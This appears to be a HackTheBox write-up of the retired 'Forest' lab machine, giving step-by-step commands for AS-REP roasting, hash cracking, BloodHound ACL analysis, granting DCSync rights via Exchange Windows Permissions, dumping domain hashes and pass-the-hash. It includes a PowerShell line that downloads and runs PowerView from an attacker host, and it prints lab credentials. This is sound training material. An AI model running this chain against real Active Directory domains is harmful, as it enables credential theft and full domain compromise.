---
title: "HTB Forest — AS-REP Roasting to DCSync via Exchange ACL Abuse"
date: "2025-09-22"
type: writeup
tags: [hackthebox, active-directory, as-rep-roasting, dcsync, exchange, acl-abuse]
summary: "Forest is a Windows domain controller box. The path involves AS-REP roasting an account without pre-auth, then exploiting Exchange Windows Permissions to gain DCSync rights."
difficulty: easy
platform: HackTheBox
published: true
---

## Box Overview

| Field | Value |
|-------|-------|
| OS | Windows |
| Difficulty | Easy |
| Points | 20 |
| Release | 2019-10-12 |
| Retired | 2020-03-21 |

Forest is an easy-rated Windows machine hosting a domain controller for `htb.local`. Despite its rating, it introduces two important concepts: AS-REP roasting and Exchange-based ACL privilege escalation.

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA forest 10.10.10.161
```

```
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds Windows Server 2016 microsoft-ds
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP
```

Domain: `htb.local`, DC: `FOREST`

### LDAP Enumeration

```bash
# Anonymous LDAP bind — enumerate users
ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName
```

This reveals a list of user accounts. Key account: `svc-alfresco`

## Foothold

### AS-REP Roasting

The `svc-alfresco` account has Kerberos pre-authentication disabled:

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.161
```

Output:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...long hash...
```

### Cracking the Hash

```bash
hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
```

Result: `svc-alfresco:s3rvice`

### WinRM Access

Port 5985 is open (WinRM):

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

**User flag obtained.**

## Privilege Escalation

### BloodHound Collection

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -dc forest.htb.local -c All --zip
```

### ACL Analysis

BloodHound reveals:

```
svc-alfresco → Member of → Service Accounts
Service Accounts → Member of → Privileged IT Accounts
Privileged IT Accounts → Member of → Account Operators
Account Operators → GenericAll → Exchange Windows Permissions
Exchange Windows Permissions → WriteDACL → HTB.LOCAL domain
```

### Exploit the Chain

**1. Add our user to Exchange Windows Permissions:**

```powershell
$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco -Credential $cred
```

**2. Grant DCSync rights:**

```powershell
# Import PowerView
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/PowerView.ps1')

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" `
  -PrincipalIdentity svc-alfresco -Rights DCSync
```

**3. DCSync — dump all hashes:**

```bash
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.10.10.161 -just-dc-ntlm
```

Output includes:
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

**4. Pass-the-Hash:**

```bash
impacket-psexec -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

**Root flag obtained.**

## Summary

Forest demonstrates how Microsoft Exchange's legacy permissions model can create a privileged escalation path from a service account with no pre-auth to full domain compromise. The `WriteDACL` permission on the domain object is the critical step — it allows granting DCSync rights without touching tier-0 groups directly.
